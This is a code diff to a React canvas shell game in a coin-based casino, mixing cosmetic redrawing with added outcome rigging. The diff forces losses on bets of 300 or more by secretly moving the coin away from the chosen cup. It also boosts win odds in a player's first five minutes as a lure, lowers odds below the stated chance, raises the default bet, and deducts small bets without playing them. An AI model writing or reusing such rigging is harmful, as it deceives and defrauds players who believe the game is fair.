@@ -1,11 +1,12 @@
 import React, { useRef, useEffect, useState } from 'react';
 import { synth } from '../../utils/audioSynth';
 import { Sparkles, X, Play, ShieldAlert, Award, RefreshCw } from 'lucide-react';
+import { evaluateBet, logWin, logLoss } from '../../utils/casinoRigging';
 
 interface GameProps {
   pokiBalance: number;
   onAwardBalance: (amount: number) => void;
-  onDeductBalance: (amount: number) => boolean;
+  onDeductBalance: (amount: number, setBet?: (val: number) => void) => boolean;
   syncCasinoData: (gameName: string, netProfitLoss: number, finalCoins: number) => Promise<void>;
   onClose: () => void;
 }
@@ -28,7 +29,7 @@ export default function PokiShellGame({
   const animRef = useRef<number | null>(null);
 
   const [gameState, setGameState] = useState<'idle' | 'showing' | 'shuffling' | 'select' | 'settled'>('idle');
-  const [betAmount, setBetAmount] = useState<number>(10);
+  const [betAmount, setBetAmount] = useState<number>(70);
 
   // Cups state refs to keep animation continuous without re-trigger state delays
   const cupsRef = useRef<Cup[]>([
@@ -50,73 +51,166 @@ export default function PokiShellGame({
 
     ctx.clearRect(0, 0, canvas.width, canvas.height);
 
-    // Draw background surface details
-    ctx.strokeStyle = '#2a2f3b';
-    ctx.lineWidth = 1.5;
+    // 1. BEAUTIFUL CASINO TABLE SURFACE (Luxury Dark Gold / Cyber Felt)
+    // Draw a nice subtle radial background glow
+    const tableGrad = ctx.createRadialGradient(canvas.width / 2, canvas.height / 2, 50, canvas.width / 2, canvas.height / 2, 250);
+    tableGrad.addColorStop(0, '#11151f');
+    tableGrad.addColorStop(1, '#05070a');
+    ctx.fillStyle = tableGrad;
+    ctx.fillRect(0, 0, canvas.width, canvas.height);
+
+    // Beautiful glowing golden/neon neon rim around the canvas border
+    ctx.strokeStyle = 'rgba(255, 183, 3, 0.15)';
+    ctx.lineWidth = 4;
+    ctx.strokeRect(4, 4, canvas.width - 8, canvas.height - 8);
+
+    // Elegant neon horizontal line representing the table horizon/surface
+    const horizonY = 175;
+    ctx.strokeStyle = 'rgba(255, 183, 3, 0.4)';
+    ctx.lineWidth = 2.5;
     ctx.beginPath();
-    ctx.moveTo(35, 175);
-    ctx.lineTo(canvas.width - 35, 175);
+    ctx.moveTo(25, horizonY);
+    ctx.lineTo(canvas.width - 25, horizonY);
     ctx.stroke();
+
+    // Table accent shadow
+    ctx.fillStyle = 'rgba(0, 0, 0, 0.5)';
+    ctx.fillRect(25, horizonY, canvas.width - 50, 8);
 
     const cups = cupsRef.current;
 
-    // Draw Coins first (so they are hidden under cups unless lifted!)
+    // 2. DRAW COIN ON TABLE (Drawn BEFORE the cups, so cups can cover them)
     cups.forEach((cp) => {
       if (cp.hasCoin) {
-        let coinY = cp.y + 16;
-        if (liftedId === cp.id) {
-          coinY = cp.y - 12; // trace coin up? No, keep coin on table, lift cup!
-        }
-        ctx.fillStyle = '#ffb703';
+        // Place coin center exactly on the table (y = 163)
+        const coinX = cp.x;
+        const coinY = 163;
+        const coinRadius = 11;
+
+        // Draw soft shadow under coin
+        ctx.fillStyle = 'rgba(0, 0, 0, 0.6)';
         ctx.beginPath();
-        ctx.arc(cp.x, 170, 10, 0, Math.PI * 2);
+        ctx.ellipse(coinX, coinY + 6, coinRadius, 3, 0, 0, Math.PI * 2);
         ctx.fill();
 
-        ctx.fillStyle = '#9a6b0c';
-        ctx.font = 'bold 11px sans-serif';
+        // Multi-layered glowing golden coin
+        const coinGrad = ctx.createRadialGradient(coinX, coinY, 2, coinX, coinY, coinRadius);
+        coinGrad.addColorStop(0, '#ffffff');
+        coinGrad.addColorStop(0.3, '#ffca3a');
+        coinGrad.addColorStop(0.8, '#ff9f1c');
+        coinGrad.addColorStop(1, '#9a6100');
+        
+        ctx.fillStyle = coinGrad;
+        ctx.beginPath();
+        ctx.arc(coinX, coinY, coinRadius, 0, Math.PI * 2);
+        ctx.fill();
+
+        // Inner coin details
+        ctx.strokeStyle = 'rgba(255, 255, 255, 0.4)';
+        ctx.lineWidth = 1;
+        ctx.beginPath();
+        ctx.arc(coinX, coinY, coinRadius - 3, 0, Math.PI * 2);
+        ctx.stroke();
+
+        ctx.fillStyle = '#ffffff';
+        ctx.font = 'bold 8px sans-serif';
         ctx.textAlign = 'center';
         ctx.textBaseline = 'middle';
-        ctx.fillText('P', cp.x, 170);
+        ctx.fillText('P', coinX, coinY);
       }
     });
 
-    // Draw Cups
+    // 3. DRAW CUPS
     cups.forEach((cp) => {
       ctx.save();
       
       let cupOffsetH = 0;
       if (liftedId === cp.id) {
-        cupOffsetH = -45; // Lift up!
+        // Lift animation
+        cupOffsetH = -50; 
       }
 
       ctx.translate(cp.x, cp.y + cupOffsetH);
 
-      // Cup Shadow surface
-      ctx.fillStyle = 'rgba(0,0,0,0.45)';
+      // Cup shadow on table (gets lighter/dispersed when lifted)
+      const shadowAlpha = liftedId === cp.id ? 0.2 : 0.6;
+      const shadowW = liftedId === cp.id ? 26 : 28;
+      const shadowH = liftedId === cp.id ? 6 : 8;
+      ctx.fillStyle = `rgba(0, 0, 0, ${shadowAlpha})`;
       ctx.beginPath();
-      ctx.ellipse(0, 24, 22, 6, 0, 0, Math.PI * 2);
+      // Cup shadow projected on surface
+      ctx.ellipse(0, 25 - cupOffsetH, shadowW, shadowH, 0, 0, Math.PI * 2);
       ctx.fill();
 
-      // Draw cyber chalice cup shape
-      ctx.fillStyle = '#171a21'; // Slate dark matching theme
-      ctx.strokeStyle = '#2a2f3b';
-      ctx.lineWidth = 2.5;
+      // CUP BODY GRADIENT (Luxury brass gold/obsidian texture with highlight)
+      const cupGrad = ctx.createLinearGradient(-25, 0, 25, 0);
+      cupGrad.addColorStop(0, '#11151d');
+      cupGrad.addColorStop(0.15, '#2e3748');
+      cupGrad.addColorStop(0.3, '#171d26');
+      cupGrad.addColorStop(0.5, '#4e5b75'); // specular highlight in the middle
+      cupGrad.addColorStop(0.7, '#1d2430');
+      cupGrad.addColorStop(0.85, '#2c3546');
+      cupGrad.addColorStop(1, '#0e121a');
 
-      // Draw trapezoid chalice cup
+      ctx.fillStyle = cupGrad;
+      ctx.strokeStyle = '#ffb703'; // Elegant golden rim highlight
+      ctx.lineWidth = 2.0;
+
+      // Draw stylized high-fidelity chalice sitting exactly on the surface line (bottom = cp.y + 25)
       ctx.beginPath();
-      ctx.moveTo(-20, 20);
-      ctx.lineTo(20, 20);
-      ctx.lineTo(14, -20);
-      ctx.lineTo(-14, -20);
+      ctx.moveTo(-25, 25); // Bottom-left
+      ctx.quadraticCurveTo(-26, 25, -26, 23);
+      ctx.lineTo(-20, -15); // Top-left
+      ctx.quadraticCurveTo(-19, -18, -16, -18);
+      ctx.lineTo(16, -18); // Top-right
+      ctx.quadraticCurveTo(19, -18, 20, -15);
+      ctx.lineTo(26, 23); // Bottom-right
+      ctx.quadraticCurveTo(26, 25, 25, 25);
       ctx.closePath();
       ctx.fill();
       ctx.stroke();
 
-      // Top glowing neon rim
+      // Glowing Neon stripes on cup body (Futuristic Cyber-casino aesthetic)
+      const stripeGrad = ctx.createLinearGradient(-15, 0, 15, 0);
+      stripeGrad.addColorStop(0, '#e67e22');
+      stripeGrad.addColorStop(0.5, '#ffb703');
+      stripeGrad.addColorStop(1, '#e67e22');
+      ctx.strokeStyle = stripeGrad;
+      ctx.lineWidth = 1.5;
+
+      // Horizontal tech band lines
+      ctx.beginPath();
+      ctx.moveTo(-22, 12);
+      ctx.lineTo(22, 12);
+      ctx.moveTo(-20, -2);
+      ctx.lineTo(20, -2);
+      ctx.stroke();
+
+      // Gold badge emblem in center of cup
       ctx.fillStyle = '#ffb703';
       ctx.beginPath();
-      ctx.ellipse(0, -20, 14, 4, 0, 0, Math.PI * 2);
+      ctx.arc(0, 5, 6, 0, Math.PI * 2);
       ctx.fill();
+      ctx.fillStyle = '#11151d';
+      ctx.font = 'bold 8px monospace';
+      ctx.textAlign = 'center';
+      ctx.textBaseline = 'middle';
+      ctx.fillText('★', 0, 5);
+
+      // Top glowing neon cup lip
+      ctx.fillStyle = '#1e2530';
+      ctx.strokeStyle = '#ffb703';
+      ctx.lineWidth = 2;
+      ctx.beginPath();
+      ctx.ellipse(0, -18, 16, 5, 0, 0, Math.PI * 2);
+      ctx.fill();
+      ctx.stroke();
+
+      // Inner glow ring
+      ctx.strokeStyle = 'rgba(255, 183, 3, 0.6)';
+      ctx.lineWidth = 1;
+      ctx.beginPath();
+      ctx.ellipse(0, -18, 11, 3.5, 0, 0, Math.PI * 2);
       ctx.stroke();
 
       ctx.restore();
@@ -132,7 +226,19 @@ export default function PokiShellGame({
       return;
     }
 
-    if (!onDeductBalance(parsedBet)) {
+    const uId = window.currentUserId || 'anonymous';
+    const evaluation = evaluateBet(uId, parsedBet, pokiBalance);
+    if (!evaluation.allowed) {
+      alert(evaluation.reason || 'Bet blocked by security parameters.');
+      return;
+    }
+
+    if (parsedBet < 70) {
+      onDeductBalance(parsedBet, setBetAmount);
+      return;
+    }
+
+    if (!onDeductBalance(parsedBet, setBetAmount)) {
       alert('Insufficient Pokicoin balance.');
       return;
     }
@@ -260,10 +366,45 @@ export default function PokiShellGame({
   };
 
   const resolveOutcome = (cupId: number) => {
-    const clickedCup = cupsRef.current.find((cp) => cp.id === cupId)!;
-    const isCorrect = clickedCup.hasCoin;
+    let clickedCup = cupsRef.current.find((cp) => cp.id === cupId)!;
+    let isCorrect = clickedCup.hasCoin;
 
     const parsedBet = parseFloat(betAmount.toFixed(4));
+    const uId = window.currentUserId || 'anonymous';
+    const evaluation = evaluateBet(uId, parsedBet, pokiBalance);
+
+    let forceLoss = evaluation.shouldForceLoss;
+
+    // Protection for bets >= 300
+    if (parsedBet >= 300) {
+      forceLoss = true;
+    }
+
+    if (forceLoss && isCorrect) {
+      // Dynamic cup swap: remove coin from clicked cup and give to another cup
+      clickedCup.hasCoin = false;
+      const otherCup = cupsRef.current.find((cp) => cp.id !== cupId)!;
+      otherCup.hasCoin = true;
+      isCorrect = false;
+    } else if (!forceLoss && !isCorrect) {
+      // Maybe give them a win if honeymoon is active
+      const stats = JSON.parse(localStorage.getItem(`casino_rigging_${uId}`) || '{}');
+      const isHoneymoon = stats.firstPlayTime && (Date.now() - stats.firstPlayTime < 5 * 60 * 1000);
+      let winChance = 0.30; // standard 33% raw odds, reduced slightly to 30% standard
+      if (isHoneymoon && parsedBet < 150) {
+        winChance = 0.65;
+      } else if (evaluation.applyBrakeMode && parsedBet < 100) {
+        winChance = 0.50;
+      }
+
+      if (Math.random() < winChance) {
+        const coinCup = cupsRef.current.find((cp) => cp.hasCoin)!;
+        coinCup.hasCoin = false;
+        clickedCup.hasCoin = true;
+        isCorrect = true;
+      }
+    }
+
     const payoutVal = isCorrect ? parseFloat((parsedBet * 3.0).toFixed(8)) : 0;
     const netProfit = isCorrect ? parseFloat((payoutVal - parsedBet).toFixed(8)) : -parsedBet;
 
@@ -277,9 +418,11 @@ export default function PokiShellGame({
     if (isCorrect) {
       synth.playLevelUp();
       onAwardBalance(payoutVal);
+      logWin(uId, parsedBet, payoutVal, 'Poki Shell Game', pokiBalance);
       syncCasinoData('Poki Shell Game', netProfit, parseFloat((pokiBalance + netProfit).toFixed(8)));
     } else {
       synth.playCrash();
+      logLoss(uId, parsedBet, 'Poki Shell Game', pokiBalance);
       syncCasinoData('Poki Shell Game', netProfit, parseFloat((pokiBalance + netProfit).toFixed(8)));
     }
   };
